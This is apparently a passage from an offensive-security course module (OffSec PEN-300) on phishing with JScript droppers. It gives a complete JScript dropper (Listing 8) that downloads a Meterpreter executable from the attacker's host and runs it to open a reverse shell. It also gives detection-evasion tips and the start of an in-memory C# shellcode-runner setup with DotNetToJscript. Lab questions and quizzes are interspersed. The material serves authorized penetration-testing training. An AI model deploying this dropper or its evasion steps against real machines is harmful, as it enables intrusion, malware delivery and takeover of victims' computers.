As explored in a [previous module](https://portal.offsec.com/courses/pen-300-9502/learning/phishing-with-microsoft-office-186739), Microsoft Office VBA macros are an effective and popular way to gain client-side code execution. However, JavaScript attachments are equally effective for this task, and have risen in [popularity](https://redcanary.com/threat-detection-report/threats/gootloader/).

In this Module, we'll use the _Jscript_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4931-1) file format to execute Javascript on Windows targets through the Windows Script Host.[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4931-2) Specifically, we will use these _Jscript droppers_ to execute powerful client-side attacks.

Examples of recent advanced Jscript-based malware strains include _TrickBot_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4931-3) and _Emotet_,[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4931-4) both of which are under constant development despite previous takedown efforts by law enforcement.

We'll begin with a simple dropper that opens a command prompt and gradually improve our attack by reflectively loading pre-compiled C# assembly to execute our shellcode runner completely in memory.

In this Learning Module, we will cover the following Learning Units:

- Creating a Basic Dropper in JScript
- Jscript and C#

Let's begin with a foundational discussion about the JavaScript language.


(Wikipedia, 2019), [https://en.wikipedia.org/wiki/JScript](https://en.wikipedia.org/wiki/JScript) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4931-1)


(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4931-2)


(Bromium, 2019), [https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/](https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4931-3)


(Security Soup, 2019), [https://security-soup.net/a-quick-look-at-emotets-updated-javascript-dropper/](https://security-soup.net/a-quick-look-at-emotets-updated-javascript-dropper/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4931-4)

## 5.1. Creating a Basic Dropper in Jscript

The primary client scripting language for web browsers is JavaScript, which is an interpreted language that is processed inside the browser and commonly works together with HTML and CSS to create most of the content on the World Wide Web. The functionality of JavaScript is based on the _ECMAScript_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4932-1) standard.

Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet Explorer. It can also be executed outside the browser through the _Windows Script Host_,[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4932-2) which can execute scripts in a variety of languages.

When executed outside of a web browser, Jscript is not subject to any of the security restrictions enforced by a browser sandbox. This means we can use it as a client-side code execution vector without exploiting any vulnerabilities.

This Learning Unit covers the following Learning Objectives:

- Execution of Jscript on Windows
- Jscript Meterpreter Dropper

1

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/ECMAScript](https://en.wikipedia.org/wiki/ECMAScript) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4932-1)

2

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Windows_Script_Host](https://en.wikipedia.org/wiki/Windows_Script_Host) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4932-2)

## 5.1.1. Execution of Jscript on Windows

In order to use a file type in a phishing attack, it must be easily executable. For this reason, some file types are better suited for phishing attacks than others. To demonstrate this, let's inspect PowerShell and Jscript files on our victim machine and see how they are handled by Windows.

In Windows, a file's format is identified by the file extension and not its actual content. Additionally, file extensions are often associated with default applications. To view these associations, we can navigate to _Settings_ > _Apps_ > _Default apps_, scroll to the bottom, and click on _Choose default apps by file type_, shown below:

![[OffSec/OSEP/Course/z. images/28db3939a4ac357304498ee6f3e82e11_MD5.jpg]]

Figure 1: Default apps by file type

Scrolling down the list, we notice that the default application for PowerShell scripting files (**.ps1**) is Notepad. This means that if we double-click on a PowerShell script, it will not be executed, but instead will be opened for editing in Notepad. Because of this, even if we were able to convince the victim to double-click a PowerShell file, it would not be executed.

On the other hand, the default application for **.js** files is the Windows-Based Script Host. This means that if we double-click a **.js** file, the content will be executed.

As mentioned previously, executing Jscript outside the context of a web browser bypasses all security settings. This allows us to interact with the older _ActiveX_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4969-1) technology and the Windows Script Host engine itself. Let's discuss what we can do with this combination.

As shown in the code in Listing 1, we can leverage ActiveX by invoking the _ActiveXObject_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4969-2) constructor by supplying the name of the object. We can then use _WScript.Shell_ to interact with the Windows Script Host Shell to execute external Windows applications. For example, we can instantiate a _Shell_ object named "shell" from the _WScript.Shell_ class through the _ActiveXObject_ constructor to run cmd.exe through the _Run_ command:

```
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

> Listing 1 - Jscript launching cmd.exe through ActiveX

After saving the code to a file with the **.js** extension and double-clicking it, the script is executed and launches a command prompt. The Windows Script Host itself exits as soon as the Jscript file is complete, so we won't observe it in Process Explorer.

In the next section, we'll build upon this to create a Jscript dropper that will execute a Meterpreter reverse shell.

1

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/ActiveX](https://en.wikipedia.org/wiki/ActiveX) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4969-1)

2

(Mozilla, 2019), [https://developer.mozilla.org/en-US/docs/Archive/Web/JavaScript/Microsoft_Extensions/ActiveXObject](https://developer.mozilla.org/en-US/docs/Archive/Web/JavaScript/Microsoft_Extensions/ActiveXObject) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4969-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|Execution of Jscript on Windows - dev01|||

#### Labs

1. Start dev01 VM and repeat the steps illustrated in this section in order to launch a command shell by clicking a Jscript file. Then try creating a simple Jscript file that opens an application. Which Jscript method is employed to run an external program or command?

Answer

2. Explore other file extension default application. What is the default application for the .vba file extension?

```
A) Notepad
B) Microsoft Excel 
C) Microsoft Visual Basic for Applications Editor
D) Windows Script Host
```

Answer

3. What technology is leveraged by Jscript when executed outside a web browser to interact with Windows Script Host?

```
A) ActiveX
B) COM
C) WMI
D) PowerShell
```

Answer

4. Connect to the dev01 machine and find the flag1.js code under the **c:\tools\exercises** folder. To obtain the flag, identify and correct the error in the provided JScript code, then run the corrected script.

Answer

## 5.1.2. Jscript Meterpreter Dropper

Next, we'll expand our usage of Jscript to create a dropper that downloads a Meterpreter executable from our Kali Linux web server and executes it. This will require several components.

First, we'll use _msfvenom_ to generate a 64-bit Meterpreter reverse HTTPS executable named **met.exe** and save it to our Kali web root. We'll also set up a Metasploit multi/handler to catch the session.

With our executable generated and our handler waiting, let's begin building our dropper code. We'll start with a simple HTTP GET request from Jscript.

To do that, we can use the _MSXML2.XMLHTTP_ object, which is based on the Microsoft XML Core Services,[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-1) and its associated HTTP protocol parser. This object provides client-side protocol support to communicate with HTTP servers. Although it is not documented, it is present in all modern versions of Windows.

As shown in Listing 2, we can use the _CreateObject_ method of the Windows Script Host to instantiate the _MSXML2.XMLHTTP_ object, then use the _Open_ and _Send_ methods to perform an HTTP GET request. The _Open_ method takes three arguments. The first is the HTTP method, in our case GET. The second argument is the URL, and the third argument indicates that the request should be synchronous.

To summarize our code, we'll use the (_url_) variable to set the URL of the Meterpreter executable. Then we'll create a Windows Script _MSXML2.XMLHTTP_ object and call the _Open_ method on that object to specify a GET request along with the URL. Finally, we'll send the GET request to download the file.

```
var url = "http://192.168.251.151/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

> Listing 2 - HTTP GET request from Jscript

Now that we have sent the HTTP GET request, we'll perform two actions. The first is to determine if the request was successful. We can do this by checking the _Status_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-2) property of the _MSXML2.XMLHTTP_ object and comparing it to the value "200", the HTTP _OK_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-3) status code. We'll use an _if_ statement:

```
if (Object.Status == 200)
{
```

> Listing 3 - Checking the HTTP status

After receiving a successful status, we'll create a _Stream_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-4) object and copy the HTTP response into it for further processing. The _Stream_ object is instantiated from _ADODB.Stream_ through the _CreateObject_ method.

```
var Stream = WScript.CreateObject('ADODB.Stream');
```

> Listing 4 - Creating a Stream object

Next, we'll invoke _Open_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-5) on the _Stream_ object and begin editing the properties of the stream. First, we'll set the _Type_[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-6) property (_adTypeBinary_) to "1" to indicate we are using binary content.

Next, we'll call the _Write_[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-7) method to save the _ResponseBody_[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-8) (our Meterpreter executable) to the stream.

Finally, we'll reset the _Position_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-9) property to "0" to instruct the _Stream_ to point to the beginning of its content.

```
Stream.Open();
Stream.Type = 1; // adTypeBinary
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
```

> Listing 5 - Writing the Stream object

So far, we have sent a GET request for our **met.exe** file and have validated that the request was successful. Next, we wrote the binary content to our ADODB stream. Now, with the content stored in the _Stream_ object, we must create a file and write the binary content to it. As shown in Listing 6, we can use the _SaveToFile_[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-10) method.

This method takes two arguments: the first is the filename, and second is the save options - _SaveOptionsEnum_. We'll set the filename to **met.exe** and the _SaveOptionsEnum_ to _adSaveCreateOverWrite_, with the numerical value of "2" to force a file overwrite. After we perform the _SaveToFile_ action, we need to _Close_[11](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-11) the _Stream_ object:

```
Stream.SaveToFile("met.exe", 2);
Stream.Close();
```

> Listing 6 - Saving the Meterpreter executable to disk

As a final step, we'll reuse the Windows Script Host Shell to execute the newly written Meterpreter executable.

```
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

> Listing 7 - Running the Meterpreter executable

The complete Jscript code to download and execute our Meterpreter shell is displayed below:

```
var url = "http://192.168.251.151/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

> Listing 8 - Complete Jscript code to download and execute Meterpreter shell

After saving this code as a **.js** file, we only need to double-click it to get a 64-bit shell from the victim's machine to our awaiting multi/handler listener.

It is worth mentioning that Jscript supports proxy configuration via the _setProxy_[12](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4938-12) method.

Now that we've covered the basics of Jscript, we'll again expand our tradecraft to implement an in-memory shellcode runner. Since there is no way to implement this directly in Jscript, we must rely on a second language.

1

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/MSXML](https://en.wikipedia.org/wiki/MSXML) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-1)

2

(Microsoft, 2016), [https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms767625(v%3Dvs.85)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms767625%28v%3dvs.85%29) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-2)

3

(Mozilla, 2019), [https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-3)

4

(W3Schools, 2019), [https://www.w3schools.com/asp/ado_ref_stream.asp](https://www.w3schools.com/asp/ado_ref_stream.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-4)

5

(W3Schools, 2019), [https://www.w3schools.com/asp/met_stream_open.asp](https://www.w3schools.com/asp/met_stream_open.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-5)

6

(W3Schools, 2019), [https://www.w3schools.com/asp/prop_stream_type.asp](https://www.w3schools.com/asp/prop_stream_type.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-6)

7

(W3Schools, 2019), [https://www.w3schools.com/asp/met_stream_write.asp](https://www.w3schools.com/asp/met_stream_write.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-7)

8

(Microsoft, 2016), [https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms753682(v%3Dvs.85)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms753682%28v%3dvs.85%29) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-8)

9

(W3Schools, 2019), [https://www.w3schools.com/asp/prop_stream_position.asp](https://www.w3schools.com/asp/prop_stream_position.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-9)

10

(W3Schools, 2019), [https://www.w3schools.com/asp/met_stream_savetofile.asp](https://www.w3schools.com/asp/met_stream_savetofile.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-10)

11

(W3Schools, 2019), [https://www.w3schools.com/asp/met_stream_close.asp](https://www.w3schools.com/asp/met_stream_close.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-11)

12

(Microsoft, 2016), [https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms760236(v%3Dvs.85)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4938-12)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Jscript Meterpreter Dropper - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to launch a reverse Meterpreter from the Windows 11 client to our Kali machine shell via Jscript. Which method is used to save the downloaded Meterpreter file to disk?

```
A) SaveToFile()
B) Send()
C) Stream.Open()
D) Object.Status()
```

Answer

2. Which object is used in Jscript to send an HTTP GET request?

```
A) WScript.Shell
B) MSXML2.XMLHTTP
C) ADODB.Stream
D) ActiveXObject
```

Answer

3. What is the numerical value of the second argument in the SaveToFile() method used for?

```
A) To specify the size of the file.
B) To force the file to be overwritten if it already exists.
C) To indicate the compression level.
D) To specify the location of the file.
```

Answer

4. On the dev01 client, in order to obtain the flag, modify the necessary code inside _flag2.js_ in order to get a reverse meterpreter shell.

Answer

## 5.2. Jscript and C#

This Learning Unit covers the following Learning Objectives:

- Introduction to Visual Studio
- Converting .NET to JScript with DotNetToJscript
- Calling Win32 API from C#
- Writing a Shellcode Runner in C# and Jscript

To improve our Jscript tradecraft and run our payload completely from memory, we'll again invoke Win32 APIs, just as we did in the [Microsoft Office Module](https://portal.offsec.com/courses/pen-300-9502/learning/phishing-with-microsoft-office-186739).

Previously, we used PowerShell for this. However, PowerShell has been widely utilized for years by both penetration testers and malware authors, prompting security solution providers, including Microsoft, to implement measures against its malicious use. While C# has also been in the spotlight for some time now and shares similar concerns, we can still leverage it to expand our skillset by learning multiple approaches. In this module, we will use C# to help reduce our profile, which may aid in avoiding detection.

Since there's no known way to invoke the Win32 APIs directly from Jscript, we'll instead embed a compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as PowerShell, since we will have comparable access to the .NET framework. This is a powerful technique that has recently gained a lot of attention and popularity.

Before we build this, let's cover some basics of the C# development environment (_Visual Studio_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4943-1)), which is already installed on the Windows 11 development machine.

1

(Microsoft, 2019), [https://visualstudio.microsoft.com/](https://visualstudio.microsoft.com/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4943-1)

## 5.2.1. Introduction to Visual Studio

There are two primary integrated development environments (IDEs)[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4944-1) focused on developing and compiling C# applications: Mono[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4944-2) and Microsoft Visual Studio. In this course, we will leverage Visual Studio, but most (if not all) code examples will also compile with Mono.

Visual Studio is already installed on the Windows 11 development machine, but when it is reverted, all previously-written code will be lost. To solve this issue, we'll create a Kali _Samba_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4944-3) share for our code to save our code between system reverts.

As Samba is already installed on Kali, we'll need to make a backup of its configuration file (**smb.conf**) and create a fresh configuration file, as shown:

```
kali@kali:~$ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old

kali@kali:~$ sudo nano /etc/samba/smb.conf
```

> Listing 9 - Installing Samba on Kali Linux

We'll create the new simple SMB configuration file with the content shown below. If we choose to use a different user account, we can simply alter the path variable:

```
[visualstudio]
 path = /home/kali/data
 browseable = yes
 read only = no
```

> Listing 10 - New content of smb.conf

Next, we need to create a samba user that can access the share, then start the required services shown below:

```
kali@kali:~$ sudo smbpasswd -a kali
New SMB password:
Retype new SMB password:
Added user kali.

kali@kali:~$ sudo systemctl start smbd

kali@kali:~$ sudo systemctl start nmbd
```

> Listing 11 - Creating SMB user and starting services

Finally, we'll create the shared folder and open up the permissions for Visual Studio:

```
kali@kali:~$ mkdir /home/kali/data

kali@kali:~$ chmod -R 777 /home/kali/data
```

> Listing 12 - Creating the shared folder and setting permissions

With everything set up, let's return to our Windows 11 development machine. First, we'll open the new share in File Explorer (**\\192.168.251.151**, in our case). When prompted, we'll enter the username and password of the newly-created SMB user and select the option to store the credentials.

![[OffSec/OSEP/Course/z. images/141feb83c85cb8e118915a7a926c3942_MD5.jpg]]

Figure 2: Accessing the shared SMB folder on our Kali machine

Now that our environment is prepared, let's create a new "Hello World" project. We'll launch Visual Studio from the taskbar and choose _Create a new project_ from the splash screen.

Next, we'll set the _Language_ dropdown menu to C# and select _Console App (.NET Framework)_, as shown:

![[OffSec/OSEP/Course/z. images/c6429706c8090e9ac1645b2d4310bc39_MD5.jpg]]

Figure 2: Selecting a C# Console App

After selecting the project type and clicking next, we must set the _Location_ of the project. In our case, we'll use the **visualstudio** folder on our network share.

![[OffSec/OSEP/Course/z. images/5b2cca6a13d8513bd8b8550ee8df6d5f_MD5.jpg]]

Figure 2: Selecting a C# Console App

For the remaining options, we'll accept the default values and click _Create_. It may take some time to create the project.

Once Visual Studio opens, we'll find that we've created both a _solution_ and a project. The solution is a parent unit that may contain multiple projects.

Let's take a moment to examine the basic workspace configuration. The first window we'll notice is the _Solution Explorer_ on the far right side, which can be thought of as the file and property explorer for the solution's contents. Here, we'll observe the source code file related to the current project, in our case named **Program.cs** as highlighted below.

![[OffSec/OSEP/Course/z. images/6720ddbd394455c89ff81b7c9447892f_MD5.jpg]]

Figure 3: Using Solution Explorer

On the left side of the workspace, we can inspect the contents of the file selected in the Solution Explorer. By default, this view will show the contents of **Program.cs**. The code for a typical C# console application is shown below.

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
```

> Listing 13 - Default program stub for a C# console application

Let's highlight significant parts of the code above. The first five lines contain _using_ statements. These statements import the codebase from the .NET framework. Next, the _Main_ method defines the entry point of our application when it is compiled.

Let's add a line of code inside the _Main_ method to create our simple application. We will use the _Console.WriteLine_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4944-4) method to print some text to the console when the application is executed.

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World");
        }
    }
}
```

> Listing 14 - Adding the call to Console.WriteLine

With our code added, we can save the changes with either _File_ > _Save Program.cs_ or C+s. Next, we'll modify the default solution settings before we compile our code. We'll switch from _Debug_ mode to _Release_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4944-5) mode to remove the debugging information that could trigger some security scanning software (Figure 4).

![[OffSec/OSEP/Course/z. images/5c190e5e285e5924165d06ffd78752a6_MD5.jpg]]

Figure 4: Choosing between Debug and Release mode

We can now compile our application by navigating to _Build_ > _Build Solution_ or _Build_ > _Build ConsoleApp1_, which will compile either the whole solution or only the current project, respectively. Whether the compilation succeeds or fails, we can view the output in the _Output_ window at the bottom of Visual Studio (Figure 5).

![[OffSec/OSEP/Course/z. images/ab79ba44f542c4c50c5439ca8bbe9c6b_MD5.jpg]]

Figure 5: Output of the build process

Fortunately, our code compiled without any issues. The compilation output also indicates the path to the newly-compiled executable. In our particular example, it saved to the following path:

```
\\192.168.251.151\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe
```

> Listing 15 - The path to our new executable

We can now open a command prompt on our Windows machine and enter this path to execute our new program. After a few seconds, we are presented with "Hello World", as shown below:

```
C:\Users\Offsec> \\192.168.251.151\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe
Hello World
```

> Listing 16 - Executing the Hello World application

Great! In the next section, we are going to expand on what we learned so far by generating Jscript code through DotNetToJscript.

1

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/Integrated_development_environment](https://en.wikipedia.org/wiki/Integrated_development_environment) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4944-1)

2

(Mono, 2019), [https://www.mono-project.com/docs/about-mono/languages/csharp/](https://www.mono-project.com/docs/about-mono/languages/csharp/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4944-2)

3

(Samba, 2019), [https://www.samba.org/](https://www.samba.org/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4944-3)

4

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.console.writeline?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.console.writeline?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4944-4)

5

(Microsoft, 2018), [https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-set-debug-and-release-configurations?view=vs-2019](https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-set-debug-and-release-configurations?view=vs-2019) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4944-5)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Introduction to Visual Studio - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to compile and execute the "Hello World" application on the Windows 11 dev machine via the Samba server.

In the Visual Studio project setup, which project type is selected?

```
A) ASP.NET Core Web Application
B) WPF Application
C) Console App (.NET Framework)
D) Blazor Server App
```

Answer

2. Which method is used to print "Hello World" to the console in the C# application?

```
A) Console.ReadLine()
B) System.Out.Write()
C) Console.WriteLine()
D) MessageBox.Show()
```

Answer

3. Connect to the dev01 machine and open the _flag3.txt_ file from the _Tools_ folder. In order to get the flag, find and correct the code mistakes and compile the code under Visual Studio.

Answer

## 5.2.2. DotNetToJscript

Now that we've explored the basics of Visual Studio, let's introduce C# code into our Jscript.

In 2017, security researcher _James Forshaw_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-1) created the _DotNetToJscript_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-2) project that demonstrated how to execute C# assembly from Jscript. In this section, we'll use this technique to create our in-memory shellcode runner.

First, we need to copy the DotNetToJscript folder project from the Windows 11 machine over to our Kali machine so it can be accessed via SMB.

When opening the Visual Studio solution from a remote location, a security warning, similar to the one below, prompts us asking if we really want to open it:

![[OffSec/OSEP/Course/z. images/0ca271bb3ffcaebaf0bfccdae9d9b4ad_MD5.jpg]]

Figure 6: Security warning when opening a remote project

The security warning raises awareness about the potential for malicious code in configuration files that could lead to arbitrary code execution. Essentially, a remote project can become a client side code execution vector.

When opening the Visual Studio project, ensure that the Samba path matches that of your Kali system and accept the security warnings.

Once we've moved past the first warning, a second message prompts us to update the project to the current .NET Framework version.

![[OffSec/OSEP/Course/z. images/f1ac5c6be343af8e63cb1d6eafa4739a_MD5.jpg]]

Figure 6: .NET Framework update

We can proceed with the recommended option and update the target project to 4.8 version of the framework.

Before moving forward, we first need to comment out the following portion of the **Program.cs** source code file present under the _DotNetToJScript_ project.

At line 154, we need to comment out the following if-block.

![[OffSec/OSEP/Course/z. images/29b4e7f4aeab00a2562778a1fb5d2245_MD5.jpg]]

Figure 7: Removing legacy .NET version check

This code portion is checking for .NET version 2 only, which would break the tool functionality on systems running newer .NET runtime versions.

Once we've updated the **Program.cs** code, we can navigate to the Solution Explorer and open **TestClass.cs** under the _ExampleAssembly_ project.

We'll compile this as a **.dll** assembly, which we'll execute in Jscript. This simple project will display a "Test" message box.

```
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

> Listing 17 - The default ExampleAssembly code

Jscript will eventually execute the content of the _TestClass_ method, which is inside the _TestClass_ class. In this case, we are simply executing the _MessageBox.Show_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-3) method.

We'll notice that the Solution Explorer lists a second project (DotNetToJscript), which converts the assembly into a format that Jscript can execute.

At this point, let's switch from Debug to Release mode and compile the entire solution using _Build_ > _Build Solution_.

